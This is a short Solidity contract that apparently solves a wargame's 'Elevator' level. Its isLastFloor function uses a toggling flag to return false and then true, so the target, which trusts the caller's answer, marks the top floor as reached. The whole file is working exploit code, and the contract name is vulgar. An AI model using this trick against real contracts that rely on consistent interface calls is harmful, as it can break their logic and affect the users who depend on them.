pragma solidity >=0.8.2 <0.9.0;

interface Elevator {
  function goTo(uint256 _floor) external;
}

contract ElevatorFucker {

  address c;
  constructor(address _c) { c = _c; }

  function goTo(uint256 _floor) external {
    Elevator(c).goTo(_floor);
  }

  bool public flag;
  function isLastFloor(uint256) external returns (bool) {
    if (!flag) {flag = true; return false;} 
    flag = false; return true;
  }
}
